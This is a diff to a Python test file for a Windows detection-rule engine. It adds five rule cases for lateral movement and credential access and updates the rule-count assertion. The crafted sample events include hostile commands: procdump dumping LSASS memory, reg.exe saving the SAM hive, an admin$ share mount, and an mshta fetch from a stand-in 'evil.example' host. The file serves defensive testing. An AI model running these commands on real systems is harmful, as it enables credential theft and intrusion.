@@ -1,8 +1,9 @@
 """Day 10 verification (Pair 1): "test each rule against crafted sample
-events" -- the full fire/no-fire matrix for all 10 rules in
+events" -- the full fire/no-fire matrix for all rules in
 detection/rules/, end to end through rule_loader.load_rules() +
 engine.evaluate_event(). Filename matches the roadmap's Day 10 Files
-column exactly.
+column exactly. Extended Day 12 with 5 more cases (lateral movement /
+credential access rules, 10 -> 15 total).
 """
 
 from datetime import datetime, timezone
@@ -75,6 +76,36 @@ RULE_CASES = [
         {"Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe http://evil.example/payload.hta"},
         {"Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe"},
     ),
+    (
+        "LSASS Memory Dump",
+        1,
+        {"Image": "C:\\Tools\\procdump.exe", "CommandLine": "procdump.exe -ma lsass.exe lsass.dmp"},
+        {"Image": "C:\\Tools\\procdump.exe", "CommandLine": "procdump.exe -ma notepad.exe notepad.dmp"},
+    ),
+    (
+        "SAM/SYSTEM/SECURITY Registry Hive Dump",
+        1,
+        {"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg.exe save hklm\\sam C:\\temp\\sam.hive"},
+        {"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg.exe query hklm\\software\\microsoft"},
+    ),
+    (
+        "RDP Lateral Movement",
+        3,
+        {"Image": "C:\\Windows\\System32\\mstsc.exe", "DestinationIp": "10.0.0.5", "DestinationPort": "3389"},
+        {"Image": "C:\\Windows\\System32\\svchost.exe", "DestinationIp": "10.0.0.5", "DestinationPort": "443"},
+    ),
+    (
+        "Lateral Movement via Windows Admin Share",
+        1,
+        {"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net.exe use \\\\10.0.0.5\\admin$ /user:admin"},
+        {"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net.exe use \\\\10.0.0.5\\shared /user:admin"},
+    ),
+    (
+        "WinRM Lateral Movement",
+        3,
+        {"Image": "C:\\Windows\\System32\\powershell.exe", "DestinationIp": "10.0.0.5", "DestinationPort": "5985"},
+        {"Image": "C:\\Windows\\System32\\powershell.exe", "DestinationIp": "10.0.0.5", "DestinationPort": "80"},
+    ),
 ]
 
 
@@ -88,8 +119,8 @@ def _event(event_id, event_data):
     )
 
 
-def test_exactly_ten_rules_are_covered_by_this_matrix():
-    assert len(RULE_CASES) == 10
+def test_exactly_fifteen_rules_are_covered_by_this_matrix():
+    assert len(RULE_CASES) == 15
     rules = rule_loader.load_rules()
     assert {title for title, *_ in RULE_CASES} == {r.title for r in rules}
 
